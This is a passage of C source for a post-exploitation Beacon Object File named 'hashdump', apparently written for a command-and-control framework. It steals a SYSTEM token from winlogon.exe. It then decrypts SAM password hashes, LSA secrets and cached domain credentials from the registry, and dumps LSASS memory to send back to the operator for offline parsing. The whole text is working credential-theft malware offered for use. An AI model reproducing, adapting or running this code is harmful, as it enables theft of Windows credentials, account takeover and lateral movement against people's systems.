        ADVAPI32$RegQueryValueExW(hUser, L"V", NULL, NULL, vValue, &vLen);

        /*
         * V value layout (header is array of {offset, length, unknown} DWORDs):
         *   [0x0C] username offset (relative to 0xCC), [0x10] username length
         *   ...
         *   [0x9C] LM hash offset, [0xA0] LM hash length
         *   [0xA8] NT hash offset, [0xAC] NT hash length
         *   Data area starts at 0xCC
         */
        DWORD nameOff = *(DWORD *)(vValue + 0x0C) + 0xCC;
        DWORD nameLen = *(DWORD *)(vValue + 0x10);
        DWORD ntOff   = *(DWORD *)(vValue + 0xA8) + 0xCC;
        DWORD ntLen   = *(DWORD *)(vValue + 0xAC);
        DWORD lmOff   = *(DWORD *)(vValue + 0x9C) + 0xCC;
        DWORD lmLen   = *(DWORD *)(vValue + 0xA0);

        /* Extract username (UTF-16LE → ASCII for output) */
        char username[128] = {0};
        if (nameOff + nameLen <= vLen && nameLen > 0 && nameLen < 256) {
            wchar_t *wName = (wchar_t *)(vValue + nameOff);
            int wLen = nameLen / 2;
            for (int j = 0; j < wLen && j < 127; j++)
                username[j] = (char)(wName[j] & 0x7F);
        }

        /* Decrypt NT hash */
        unsigned char ntHash[16];
        MSVCRT$memcpy(ntHash, EMPTY_NT, 16);
        if (ntOff + ntLen <= vLen && ntLen >= 4) {
            _decrypt_sam_hash(samKey, rid, vValue + ntOff, ntLen, ntHash);
        }

        /* Decrypt LM hash */
        unsigned char lmHash[16];
        MSVCRT$memcpy(lmHash, EMPTY_LM, 16);
        if (lmOff + lmLen <= vLen && lmLen >= 4) {
            _decrypt_sam_hash(samKey, rid, vValue + lmOff, lmLen, lmHash);
        }

        /* Output in SAM format: username:RID:LM:NT::: */
        char lmHex[33], ntHex[33];
        _hex(lmHash, 16, lmHex);
        _hex(ntHash, 16, ntHex);
        BeaconPrintf(CALLBACK_OUTPUT, "%s:%d:%s:%s:::", username, rid, lmHex, ntHex);
        userCount++;

        _free(vValue);
        ADVAPI32$RegCloseKey(hUser);
    }

    ADVAPI32$RegCloseKey(hUsers);
    ADVAPI32$RegCloseKey(hAccount);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] SAM: Dumped %d user(s)\n", userCount);
}

/* ═══════════════════════════════════════════════════════════════════
 *  LSA Secrets extraction
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * LSA secret blob structure (Vista+):
 *   [0x00] Version (DWORD)
 *   [0x04] EncKeyID (16 bytes)
 *   [0x14] EncAlgorithm (DWORD)
 *   [0x18] Flags (DWORD)
 *   [0x1C] EncryptedData:
 *            [+0x00] Salt (16 bytes)
 *            [+0x10] ...payload...
 *
 * Decryption: SHA256(LSAKey + salt*1000) → AES-128-CBC key
 */

static BOOL _decrypt_lsa_blob(const unsigned char *lsaKey, int lsaKeyLen,
                                const unsigned char *blob, int blobLen,
                                unsigned char **out, int *outLen) {
    if (blobLen < 0x1C + 16) return FALSE;

    const unsigned char *encData = blob + 0x1C;
    int encDataLen = blobLen - 0x1C;
    if (encDataLen < 16 + 16) return FALSE;

    const unsigned char *salt = encData;
    const unsigned char *ciphertext = encData + 16;
    int cipherLen = encDataLen - 16;

    /* Derive key: SHA256(lsaKey + salt * 1000) */
    unsigned char derivedKey[32];
    if (!_sha256_salted(lsaKey, lsaKeyLen, salt, 16, derivedKey))
        return FALSE;

    unsigned char *decrypted = (unsigned char *)_alloc(cipherLen);
    if (!decrypted) return FALSE;

    unsigned char zeroIV[16];
    MSVCRT$memset(zeroIV, 0, 16);
    int decLen = 0;
    if (!_aes_decrypt_cbc(derivedKey, 16, zeroIV, 16, ciphertext, cipherLen, decrypted, &decLen)) {
        _free(decrypted);
        return FALSE;
    }

    *out = decrypted;
    *outLen = decLen;
    return TRUE;
}

static BOOL _get_lsa_key(const unsigned char *bootKey, unsigned char *lsaKey, int *lsaKeyLen) {
    HKEY hPol = NULL;
    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SECURITY\\Policy\\PolEKList", 0, KEY_READ, &hPol) != 0) {
        /* Try pre-Vista key */
        if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SECURITY\\Policy\\PolSecretEncryptionKey", 0, KEY_READ, &hPol) != 0) {
            return FALSE;
        }
    }

    DWORD polLen = 0;
    ADVAPI32$RegQueryValueExW(hPol, L"", NULL, NULL, NULL, &polLen);
    if (polLen == 0) { ADVAPI32$RegCloseKey(hPol); return FALSE; }

    unsigned char *polData = (unsigned char *)_alloc(polLen);
    if (!polData) { ADVAPI32$RegCloseKey(hPol); return FALSE; }
    ADVAPI32$RegQueryValueExW(hPol, L"", NULL, NULL, polData, &polLen);
    ADVAPI32$RegCloseKey(hPol);

    /* Decrypt the PolEKList blob */
    unsigned char *decrypted = NULL;
    int decLen = 0;

    /* For PolEKList, the encrypted data starts at offset 0x1C, salt at 0x1C */
    /* But the outer structure IS an LSA blob itself, encrypted with bootKey */
    if (polLen < 0x1C + 16 + 16) {
        _free(polData);
        return FALSE;
    }

    const unsigned char *salt = polData + 0x1C;
    const unsigned char *encData = polData + 0x1C + 16;
    int encLen = polLen - 0x1C - 16;

    unsigned char derivedKey[32];
    if (!_sha256_salted(bootKey, 16, salt, 16, derivedKey)) {
        _free(polData);
        return FALSE;
    }

    decrypted = (unsigned char *)_alloc(encLen);
    if (!decrypted) { _free(polData); return FALSE; }

    unsigned char zeroIV[16];
    MSVCRT$memset(zeroIV, 0, 16);
    if (!_aes_decrypt_cbc(derivedKey, 16, zeroIV, 16, encData, encLen, decrypted, &decLen)) {
        _free(decrypted);
        _free(polData);
        return FALSE;
    }

    /*
     * Decrypted PolEKList contains key material. Structure (Vista+):
     *   [0x00] Version (DWORD)
     *   [0x04] Reserved (DWORD)
     *   [0x08] Reserved (DWORD)
     *   [0x0C] KeyCount (DWORD)
     *   [0x10] Key entry:
     *     [+0x00] KeyLen (DWORD)
     *     [+0x04] Reserved (DWORD * 3)
     *     [+0x10] KeyData (KeyLen bytes)
     *
     * The actual LSA key is typically 32 bytes at offset 0x20 in decrypted data.
     * (After the header: 4+4+4+4 = 0x10, then key entry: 4+12 = 0x10, total 0x20)
     */
    if (decLen >= 0x20 + 32) {
        MSVCRT$memcpy(lsaKey, decrypted + 0x20, 32);
        *lsaKeyLen = 32;
    } else if (decLen >= 0x10 + 16) {
        /* Fallback: smaller structure */
        MSVCRT$memcpy(lsaKey, decrypted + 0x10, decLen - 0x10 > 32 ? 32 : decLen - 0x10);
        *lsaKeyLen = decLen - 0x10 > 32 ? 32 : decLen - 0x10;
    } else {
        _free(decrypted);
        _free(polData);
        return FALSE;
    }

    _free(decrypted);
    _free(polData);
    return TRUE;
}

static void _hexdump_line(const unsigned char *data, int len, int offset) {
    char line[128];
    int pos = MSVCRT$_snprintf(line, sizeof(line), "    %04X  ", offset);
    for (int i = 0; i < 16 && i < len; i++)
        pos += MSVCRT$_snprintf(line + pos, sizeof(line) - pos, "%02x ", data[i]);
    BeaconPrintf(CALLBACK_OUTPUT, "%s", line);
}

static void _dump_lsa_secrets(const unsigned char *bootKey) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] ======== LSA Secrets ========\n");

    unsigned char lsaKey[32];
    int lsaKeyLen = 0;
    if (!_get_lsa_key(bootKey, lsaKey, &lsaKeyLen)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LSA: Failed to extract LSA key (need SYSTEM on SECURITY hive)");
        return;
    }

    /* Enumerate SECURITY\Policy\Secrets\* */
    HKEY hSecrets = NULL;
    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SECURITY\\Policy\\Secrets", 0, KEY_READ, &hSecrets) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LSA: Failed to open SECURITY\\Policy\\Secrets");
        return;
    }

    int secretCount = 0;
    wchar_t secretName[256];
    DWORD nameLen;

    for (DWORD idx = 0; ; idx++) {
        nameLen = 256;
        if (ADVAPI32$RegEnumKeyExW(hSecrets, idx, secretName, &nameLen,
                                    NULL, NULL, NULL, NULL) != 0)
            break;

        /* Open SecretName\CurrVal */
        wchar_t currValPath[512];
        MSVCRT$swprintf(currValPath, L"SECURITY\\Policy\\Secrets\\%s\\CurrVal", secretName);

        HKEY hCurrVal = NULL;
        if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, currValPath,
                                    0, KEY_READ, &hCurrVal) != 0)
            continue;

        DWORD dataLen = 0;
        ADVAPI32$RegQueryValueExW(hCurrVal, L"", NULL, NULL, NULL, &dataLen);
        if (dataLen == 0 || dataLen < 0x20) {
            ADVAPI32$RegCloseKey(hCurrVal);
            continue;
        }

        unsigned char *data = (unsigned char *)_alloc(dataLen);
        if (!data) { ADVAPI32$RegCloseKey(hCurrVal); continue; }
        ADVAPI32$RegQueryValueExW(hCurrVal, L"", NULL, NULL, data, &dataLen);
        ADVAPI32$RegCloseKey(hCurrVal);

        /* Decrypt */
        unsigned char *decrypted = NULL;
        int decLen = 0;
        if (!_decrypt_lsa_blob(lsaKey, lsaKeyLen, data, dataLen, &decrypted, &decLen)) {
            _free(data);
            BeaconPrintf(CALLBACK_ERROR, "[!] LSA: Failed to decrypt secret '%S'", secretName);
            continue;
        }
        _free(data);

        /* The decrypted blob has a header:
         *   [0x00] SecretSize (DWORD) — actual meaningful data length
         *   [0x04] Padding
         * Meaningful data starts after the size field.
         */
        int meaningfulLen = decLen;
        if (decLen >= 4) {
            DWORD secretSize = *(DWORD *)decrypted;
            if (secretSize > 0 && secretSize <= (DWORD)(decLen - 4))
                meaningfulLen = (int)secretSize;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Secret: %S (%d bytes)", secretName, meaningfulLen);

        /* For known secrets, display formatted output */
        unsigned char *secretData = decrypted + (decLen >= 4 ? 4 : 0);
        int showLen = meaningfulLen > 256 ? 256 : meaningfulLen;

        /* Check if it looks like printable text (UTF-16) */
        BOOL isText = TRUE;
        for (int i = 0; i < showLen && i < 128; i += 2) {
            if (i + 1 < showLen) {
                wchar_t wc = *(wchar_t *)(secretData + i);
                if (wc == 0) break;
                if (wc < 0x20 && wc != L'\r' && wc != L'\n' && wc != L'\t')
                    isText = FALSE;
            }
        }

        if (isText && showLen >= 2 && secretData[1] == 0) {
            /* UTF-16LE text */
            wchar_t *wStr = (wchar_t *)secretData;
            int wLen = showLen / 2;
            char asciiStr[256] = {0};
            for (int j = 0; j < wLen && j < 255 && wStr[j]; j++)
                asciiStr[j] = (char)(wStr[j] & 0x7F);
            BeaconPrintf(CALLBACK_OUTPUT, "    Value: %s", asciiStr);
        } else {
            /* Binary — hex dump first 64 bytes */
            for (int off = 0; off < showLen && off < 64; off += 16) {
                int lineLen = showLen - off > 16 ? 16 : showLen - off;
                _hexdump_line(secretData + off, lineLen, off);
            }
            if (showLen > 64)
                BeaconPrintf(CALLBACK_OUTPUT, "    ... (%d more bytes)", showLen - 64);
        }

        /* For $MACHINE.ACC, also show NTLM hash of machine password */
        if (secretName[0] == L'$' && secretName[1] == L'M') {
            /* Machine account password — compute NTLM hash (MD4 of UTF-16LE) */
            /* MD4 not in BCrypt, but we can output raw for user to process */
            BeaconPrintf(CALLBACK_OUTPUT, "    (Machine password raw — use NTLM hash tool for hash)");
        }

        _free(decrypted);
        secretCount++;
    }

    ADVAPI32$RegCloseKey(hSecrets);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] LSA: Dumped %d secret(s)\n", secretCount);
}

/* ═══════════════════════════════════════════════════════════════════
 *  Cached domain credentials (DCC2 / mscash2)
 * ═══════════════════════════════════════════════════════════════════ */

/* NL$KM key from SECURITY\Policy\Secrets\NL$KM */
static BOOL _get_nlkm_key(const unsigned char *lsaKey, int lsaKeyLen,
                            unsigned char *nlkmKey) {
    HKEY hKey = NULL;
    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SECURITY\\Policy\\Secrets\\NL$KM\\CurrVal", 0, KEY_READ, &hKey) != 0)
        return FALSE;

    DWORD dataLen = 0;
    ADVAPI32$RegQueryValueExW(hKey, L"", NULL, NULL, NULL, &dataLen);
    if (dataLen == 0) { ADVAPI32$RegCloseKey(hKey); return FALSE; }

    unsigned char *data = (unsigned char *)_alloc(dataLen);
    if (!data) { ADVAPI32$RegCloseKey(hKey); return FALSE; }
    ADVAPI32$RegQueryValueExW(hKey, L"", NULL, NULL, data, &dataLen);
    ADVAPI32$RegCloseKey(hKey);

    unsigned char *decrypted = NULL;
    int decLen = 0;
    if (!_decrypt_lsa_blob(lsaKey, lsaKeyLen, data, dataLen, &decrypted, &decLen)) {
        _free(data);
        return FALSE;
    }
    _free(data);

    /* NL$KM key is first 16 bytes of decrypted secret data (after 4-byte size prefix) */
    int offset = (decLen >= 4) ? 4 : 0;
    if (decLen - offset >= 16) {
        MSVCRT$memcpy(nlkmKey, decrypted + offset, 16);
        _free(decrypted);
        return TRUE;
    }
    _free(decrypted);
    return FALSE;
}

static void _dump_cached_creds(const unsigned char *bootKey) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] ======== Cached Domain Credentials (DCC2) ========\n");

    /* First get the LSA key (needed for NL$KM) */
    unsigned char lsaKey[32];
    int lsaKeyLen = 0;
    if (!_get_lsa_key(bootKey, lsaKey, &lsaKeyLen)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Cached: Failed to extract LSA key");
        return;
    }

    /* Get NL$KM key */
    unsigned char nlkmKey[16];
    if (!_get_nlkm_key(lsaKey, lsaKeyLen, nlkmKey)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Cached: Failed to extract NL$KM key (no cached creds?)");
        return;
    }

    /* Read SECURITY\Cache */
    HKEY hCache = NULL;
    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SECURITY\\Cache", 0, KEY_READ, &hCache) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Cached: Failed to open SECURITY\\Cache");
        return;
    }

    /* First read NL$IterationCount for PBKDF2 iteration count */
    DWORD iterations = 10240; /* Default */
    DWORD iterLen = sizeof(iterations);
    ADVAPI32$RegQueryValueExW(hCache, L"NL$IterationCount", NULL, NULL,
                               (LPBYTE)&iterations, &iterLen);
    if (iterations > 10240)
        iterations &= 0xFFFF; /* Use lower 16 bits */
    if (iterations == 0)
        iterations = 10240;

    int cachedCount = 0;
    wchar_t valueName[64];

    /* Cached entries are named NL$1, NL$2, ... NL$N */
    for (int i = 1; i <= 64; i++) {
        MSVCRT$swprintf(valueName, L"NL$%d", i);

        DWORD dataLen = 0;
        if (ADVAPI32$RegQueryValueExW(hCache, valueName, NULL, NULL, NULL, &dataLen) != 0)
            break;
        if (dataLen < 96) continue; /* Too small for a valid entry */

        unsigned char *entry = (unsigned char *)_alloc(dataLen);
        if (!entry) continue;
        ADVAPI32$RegQueryValueExW(hCache, valueName, NULL, NULL, entry, &dataLen);

        /*
         * Cached credential entry structure (Vista+):
         *   [0x00-0x03] UserNameLength (WORD), DomainNameLength (WORD)
         *   [0x04-0x07] EffectiveNameLength (WORD), FullNameLength (WORD)
         *   [0x08-0x0B] LogonScriptLength (WORD), ProfilePathLength (WORD)
         *   [0x0C-0x0F] HomeDirectoryLength (WORD), HomeDirectoryDriveLength (WORD)
         *   [0x10-0x13] UserId (DWORD)
         *   [0x14-0x17] PrimaryGroupId (DWORD)
         *   [0x18-0x1B] GroupCount (DWORD)
         *   [0x1C-0x1F] LogonDomainNameLength (WORD), ...
         *   [0x20-0x23] ...
         *   [0x24-0x27] ...
         *   [0x28-0x37] Flags, ...
         *   [0x38-0x3F] LastAccess (FILETIME)
         *   [0x40-0x43] Revision (DWORD)
         *   [0x44-0x47] SidCount (DWORD)
         *   [0x48-0x4F] ...
         *   [0x50-0x5F] ...
         *   [0x60-0x6F] CH (IV / 16 bytes)
         *   [0x70-...] Encrypted data
         */
        WORD userNameLen = *(WORD *)(entry + 0x00);
        WORD domainNameLen = *(WORD *)(entry + 0x02);

        /* Check if entry is empty (all zeros at username length) */
        if (userNameLen == 0) {
            _free(entry);
            continue;
        }

        /* The encrypted portion at offset 0x60: first 16 bytes = IV, rest = encrypted */
        const unsigned char *iv = entry + 0x60;
        const unsigned char *encData = entry + 0x70;
        int encLen = dataLen - 0x70;
        if (encLen < 16) {
            _free(entry);
            continue;
        }

        /* Decrypt with NL$KM + AES-128-CBC */
        unsigned char *decrypted = (unsigned char *)_alloc(encLen);
        if (!decrypted) { _free(entry); continue; }
        int decLen = 0;
        if (!_aes_decrypt_cbc(nlkmKey, 16, iv, 16, encData, encLen, decrypted, &decLen)) {
            _free(decrypted);
            _free(entry);
            continue;
        }

        /*
         * Decrypted data layout:
         *   [0x00-0x0F] msCacheHash (16 bytes) — the DCC2 hash
         *   [0x10-...] username (UTF-16LE, userNameLen bytes)
         *   [...] domain (UTF-16LE, domainNameLen bytes)
         *   ... additional data
         */
        unsigned char *msCacheHash = decrypted;

        /* Extract username from decrypted data at offset 0x10 */
        char username[128] = {0};
        if (decLen >= 0x10 + userNameLen) {
            wchar_t *wUser = (wchar_t *)(decrypted + 0x10);
            int wLen = userNameLen / 2;
            for (int j = 0; j < wLen && j < 127 && wUser[j]; j++)
                username[j] = (char)(wUser[j] & 0x7F);
        }

        /* Extract domain from decrypted data */
        char domain[128] = {0};
        int domainOff = 0x10 + userNameLen;
        /* Align to 4 bytes */
        domainOff = (domainOff + 3) & ~3;
        if (decLen >= domainOff + domainNameLen) {
            wchar_t *wDom = (wchar_t *)(decrypted + domainOff);
            int wLen = domainNameLen / 2;
            for (int j = 0; j < wLen && j < 127 && wDom[j]; j++)
                domain[j] = (char)(wDom[j] & 0x7F);
        }

        /* Output: $DCC2$iterations#username#hash */
        char hashHex[33];
        _hex(msCacheHash, 16, hashHex);
        BeaconPrintf(CALLBACK_OUTPUT, "$DCC2$%d#%s#%s", iterations, username, hashHex);
        if (domain[0])
            BeaconPrintf(CALLBACK_OUTPUT, "    Domain: %s", domain);

        _free(decrypted);
        _free(entry);
        cachedCount++;
    }

    ADVAPI32$RegCloseKey(hCache);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Cached: Dumped %d credential(s)\n", cachedCount);
}

/* ═══════════════════════════════════════════════════════════════════
 *  LSASS minidump to memory
 * ═══════════════════════════════════════════════════════════════════ */

typedef BOOL (WINAPI *pMiniDumpWriteDump)(HANDLE, DWORD, HANDLE,
    DWORD, PVOID, PVOID, PVOID);

/* Callback context for in-memory minidump */
typedef struct {
    unsigned char *buffer;
    DWORD          bufSize;
    DWORD          written;
    BOOL           overflow;
} MINIDUMP_CTX;

#define MINIDUMP_MAX_SIZE (50 * 1024 * 1024) /* 50MB cap */

/* Find LSASS PID */
static DWORD _find_lsass_pid(void) {
    ULONG bufSize = 1024 * 256;
    unsigned char *buf = (unsigned char *)_alloc(bufSize);
    if (!buf) return 0;

    ULONG retLen = 0;
    NTSTATUS st = NTDLL$NtQuerySystemInformation(SystemProcessInformation, buf, bufSize, &retLen);
    if (st != 0) {
        _free(buf);
        bufSize = retLen + 4096;
        buf = (unsigned char *)_alloc(bufSize);
        if (!buf) return 0;
        st = NTDLL$NtQuerySystemInformation(SystemProcessInformation, buf, bufSize, &retLen);
        if (st != 0) { _free(buf); return 0; }
    }

    DWORD pid = 0;
    unsigned char *ptr = buf;
    while (1) {
        DWORD nextOff = *(DWORD *)ptr;
        UNICODE_STRING *imgName = (UNICODE_STRING *)(ptr + 0x38);
        if (imgName->Length > 0 && imgName->Buffer) {
            int wlen = imgName->Length / 2;
            if (wlen >= 9) {
                wchar_t *p = imgName->Buffer + wlen - 9;
                if ((p[0] == L'l' || p[0] == L'L') &&
                    (p[1] == L's' || p[1] == L'S') &&
                    (p[2] == L'a' || p[2] == L'A') &&
                    (p[3] == L's' || p[3] == L'S') &&
                    (p[4] == L's' || p[4] == L'S') &&
                    p[5] == L'.' &&
                    (p[6] == L'e' || p[6] == L'E') &&
                    (p[7] == L'x' || p[7] == L'X') &&
                    (p[8] == L'e' || p[8] == L'E')) {
                    pid = (DWORD)(*(ULONG_PTR *)(ptr + 0x48));
                    break;
                }
            }
        }
        if (nextOff == 0) break;
        ptr += nextOff;
    }
    _free(buf);
    return pid;
}

/*
 * MiniDumpWriteDump callback for writing to a memory buffer.
 * We use MINIDUMP_CALLBACK_TYPE == IoWriteAllCallback (16).
 */
#define MINIDUMP_CALLBACK_TYPE_IoStartCallback   13
#define MINIDUMP_CALLBACK_TYPE_IoWriteAllCallback 16
#define MINIDUMP_CALLBACK_TYPE_IoFinishCallback   17

typedef struct {
    ULONG   ProcessId;
    HANDLE  ProcessHandle;
    ULONG   CallbackType;
    union {
        /* For IoWriteAllCallback: */
        struct {
            HANDLE  Handle;      /* Unused for memory */
            ULONG64 Offset;
            PVOID   Buffer;
            ULONG   BufferBytes;
        } Io;
    } u;
} MINIDUMP_CALLBACK_INPUT_CUSTOM;

typedef struct {
    union {
        ULONG  Status;   /* For IoWriteAll: S_OK to continue, S_FALSE to stop */
        ULONG  Cancel;
    } u;
} MINIDUMP_CALLBACK_OUTPUT_CUSTOM;

typedef struct {
    void *CallbackRoutine;
    void *CallbackParam;
} MINIDUMP_CALLBACK_INFORMATION_CUSTOM;

static BOOL WINAPI _minidump_callback(void *param, void *input, void *output) {
    MINIDUMP_CTX *ctx = (MINIDUMP_CTX *)param;
    MINIDUMP_CALLBACK_INPUT_CUSTOM *in = (MINIDUMP_CALLBACK_INPUT_CUSTOM *)input;
    MINIDUMP_CALLBACK_OUTPUT_CUSTOM *out = (MINIDUMP_CALLBACK_OUTPUT_CUSTOM *)output;

    if (in->CallbackType == MINIDUMP_CALLBACK_TYPE_IoStartCallback) {
        out->u.Status = 0; /* S_OK */
        return TRUE;
    }
    if (in->CallbackType == MINIDUMP_CALLBACK_TYPE_IoFinishCallback) {
        out->u.Status = 0;
        return TRUE;
    }
    if (in->CallbackType == MINIDUMP_CALLBACK_TYPE_IoWriteAllCallback) {
        ULONG64 offset = in->u.Io.Offset;
        ULONG   bytes  = in->u.Io.BufferBytes;

        if (offset + bytes > MINIDUMP_MAX_SIZE) {
            ctx->overflow = TRUE;
            out->u.Status = 1; /* S_FALSE — stop */
            return TRUE;
        }

        /* Grow buffer if needed */
        if (offset + bytes > ctx->bufSize) {
            DWORD newSize = ctx->bufSize * 2;
            if (newSize < offset + bytes)
                newSize = (DWORD)(offset + bytes + 1024 * 1024);
            unsigned char *newBuf = (unsigned char *)KERNEL32$HeapReAlloc(
                KERNEL32$GetProcessHeap(), 0, ctx->buffer, newSize);
            if (!newBuf) {
                ctx->overflow = TRUE;
                out->u.Status = 1;
                return TRUE;
            }
            ctx->buffer = newBuf;
            ctx->bufSize = newSize;
        }

        MSVCRT$memcpy(ctx->buffer + (DWORD)offset, in->u.Io.Buffer, bytes);
        if ((DWORD)(offset + bytes) > ctx->written)
            ctx->written = (DWORD)(offset + bytes);

        out->u.Status = 0;
        return TRUE;
    }

    /* All other callback types: accept */
    out->u.Status = 0;
    return TRUE;
}

static void _dump_lsass(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] ======== LSASS Dump ========\n");

    DWORD lsassPid = _find_lsass_pid();
    if (lsassPid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LSASS: Could not find lsass.exe PID");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] LSASS PID: %d", lsassPid);

    /* Open LSASS */
    HANDLE hLsass = KERNEL32$OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
    if (!hLsass) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LSASS: OpenProcess failed (error %d). Need SeDebugPrivilege or SYSTEM.",
                     KERNEL32$GetLastError());
        return;
    }

    /* Load dbghelp.dll */
    HMODULE hDbgHelp = KERNEL32$LoadLibraryA("dbghelp.dll");
    if (!hDbgHelp) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LSASS: Failed to load dbghelp.dll");
        KERNEL32$CloseHandle(hLsass);
        return;
    }

    pMiniDumpWriteDump fnMiniDump = (pMiniDumpWriteDump)
        KERNEL32$GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!fnMiniDump) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LSASS: MiniDumpWriteDump not found in dbghelp.dll");
        KERNEL32$CloseHandle(hLsass);
        return;
    }

    /* Allocate initial buffer */
    MINIDUMP_CTX ctx;
    ctx.bufSize = 8 * 1024 * 1024; /* 8MB initial */
    ctx.buffer = (unsigned char *)_alloc(ctx.bufSize);
    ctx.written = 0;
    ctx.overflow = FALSE;

    if (!ctx.buffer) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LSASS: Failed to allocate dump buffer");
        KERNEL32$CloseHandle(hLsass);
        return;
    }

    /* Set up callback for memory-only dump */
    MINIDUMP_CALLBACK_INFORMATION_CUSTOM callbackInfo;
    callbackInfo.CallbackRoutine = _minidump_callback;
    callbackInfo.CallbackParam = &ctx;

    /*
     * MiniDumpWithFullMemory (0x2) — required for pypykatz/mimikatz parsing.
     * The callback writes to our buffer instead of a file.
     * We pass INVALID_HANDLE_VALUE as the file handle.
     */
    BOOL dumpOk = fnMiniDump(hLsass, lsassPid, (HANDLE)(LONG_PTR)-1,
                              0x00000002, /* MiniDumpWithFullMemory */
                              NULL, NULL, &callbackInfo);

    KERNEL32$CloseHandle(hLsass);

    if (ctx.overflow) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LSASS: Dump exceeded %dMB limit", MINIDUMP_MAX_SIZE / (1024*1024));
        _free(ctx.buffer);
        return;
    }

    if (!dumpOk || ctx.written == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LSASS: MiniDumpWriteDump failed (error %d)",
                     KERNEL32$GetLastError());
        _free(ctx.buffer);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] LSASS dump: %d bytes (%d MB)",
                 ctx.written, ctx.written / (1024*1024));
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Sending dump as binary output. Parse offline with pypykatz:");
    BeaconPrintf(CALLBACK_OUTPUT, "    pypykatz lsa minidump lsass.dmp");

    /* Send the raw minidump as binary output */
    BeaconOutput(CALLBACK_OUTPUT, (const char *)ctx.buffer, ctx.written);

    _free(ctx.buffer);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] LSASS: Dump complete\n");
}

/* ═══════════════════════════════════════════════════════════════════
 *  BOF entry point
 * ═══════════════════════════════════════════════════════════════════ */

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    int doLsass  = BeaconDataInt(&parser);  /* --lsass  (0 or 1) */
    int doSam    = BeaconDataInt(&parser);  /* --sam    (0 or 1) */
    int doLsa    = BeaconDataInt(&parser);  /* --lsa    (0 or 1) */
    int doCached = BeaconDataInt(&parser);  /* --cached (0 or 1) */

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] hashdump BOF — SAM:%s LSA:%s Cached:%s LSASS:%s",
        doSam    ? "yes" : "no",
        doLsa    ? "yes" : "no",
        doCached ? "yes" : "no",
        doLsass  ? "yes" : "no");

    /* Check / elevate to SYSTEM */
    HANDLE hStolenToken = NULL;
    BOOL wasSystem = _is_system();
    if (!wasSystem) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Not SYSTEM — stealing token from winlogon.exe...");
        hStolenToken = _steal_system_token();
        if (hStolenToken) {
            if (ADVAPI32$ImpersonateLoggedOnUser(hStolenToken)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonating SYSTEM");
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[!] ImpersonateLoggedOnUser failed: %d",
                             KERNEL32$GetLastError());
                KERNEL32$CloseHandle(hStolenToken);
                hStolenToken = NULL;
            }
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to steal SYSTEM token. Results will be limited.");
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Already running as SYSTEM");
    }

    /* Extract boot key (needed by SAM, LSA, and cached) */
    unsigned char bootKey[16];
    BOOL haveBootKey = FALSE;
    if (doSam || doLsa || doCached) {
        haveBootKey = _get_boot_key(bootKey);
        if (haveBootKey) {
            char bkHex[33];
            _hex(bootKey, 16, bkHex);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] BootKey: %s", bkHex);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to extract boot key — SAM/LSA/Cached will fail");
        }
    }

    /* === SAM Hashes === */
    if (doSam) {
        if (haveBootKey)
            _dump_sam(bootKey);
        else
            BeaconPrintf(CALLBACK_ERROR, "[!] SAM: Skipped (no boot key)");
    }

    /* === LSA Secrets === */
    if (doLsa) {
        if (haveBootKey)
            _dump_lsa_secrets(bootKey);
        else
            BeaconPrintf(CALLBACK_ERROR, "[!] LSA: Skipped (no boot key)");
    }

    /* === Cached Domain Credentials === */
    if (doCached) {
        if (haveBootKey)
            _dump_cached_creds(bootKey);
        else
            BeaconPrintf(CALLBACK_ERROR, "[!] Cached: Skipped (no boot key)");
    }

    /* === LSASS Minidump === */
    if (doLsass) {
        _dump_lsass();
    }

    /* Revert impersonation */
    if (hStolenToken) {
        ADVAPI32$RevertToSelf();
        KERNEL32$CloseHandle(hStolenToken);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Reverted to original token");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] hashdump complete.");
}
